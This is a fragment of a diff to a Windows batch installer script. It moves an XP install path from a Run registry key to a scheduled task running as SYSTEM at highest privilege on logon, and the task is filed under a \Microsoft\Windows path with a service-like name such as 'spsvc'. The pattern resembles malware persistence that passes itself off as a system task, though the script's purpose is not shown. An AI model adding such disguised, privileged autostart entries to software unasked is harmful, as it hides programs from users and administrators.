@@ -28,12 +28,7 @@ rem Parse passed arguments to script
 :install
     if "%~1"=="" exit /b 1
 	set name=%~1
-    set dst=%ALLUSERSPROFILE%\%name%
-    
-    if "%XP%"=="1" (
-        reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%name%" /t REG_SZ /d %dst%\%name%.exe /f
-        exit /b
-    )    
+ 
     call:createtask %name%
     exit /b
     
@@ -69,10 +64,6 @@ rem Parse passed arguments to script
     set dst=%ALLUSERSPROFILE%\%name%
     set task_root=\Microsoft\Windows\%name%
     
-    if "%XP%"=="1" (
-        start /b "%dst%\%name%.exe"
-        exit /b
-    )
     schtasks /RUN /TN "%task_root%\%name%"
     exit /b
 	
@@ -82,6 +73,12 @@ rem Parse passed arguments to script
 	set dst=%ALLUSERSPROFILE%\%name%
 	set xml="%dst%\task.xml"
 	set task_root=\Microsoft\Windows\%name%
+    
+    if "%XP%"=="1" (
+        schtasks /DELETE /TN "%task_root%\%name%"
+        schtasks /Create /RU System /RL HIGHEST /SC ONLOGON /TN "%task_root%\%name%" /TR "%dst%\%name%.exe"        
+        exit /b
+    )    
 	
 	echo ^<?xml version="1.0" encoding="UTF-16"?^>^
 		^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>^
@@ -117,7 +114,7 @@ rem Parse passed arguments to script
 		^</Settings^>^
 		^<Actions Context="Author"^>^
 		^<Exec^>^
-		^<Command^>C:\ProgramData\spsvc\spsvc.bat^</Command^>^
+		^<Command^>%dst%\%name%.exe^</Command^>^
 		^</Exec^>^
 		^</Actions^>^
 		^</Task^> > %xml%
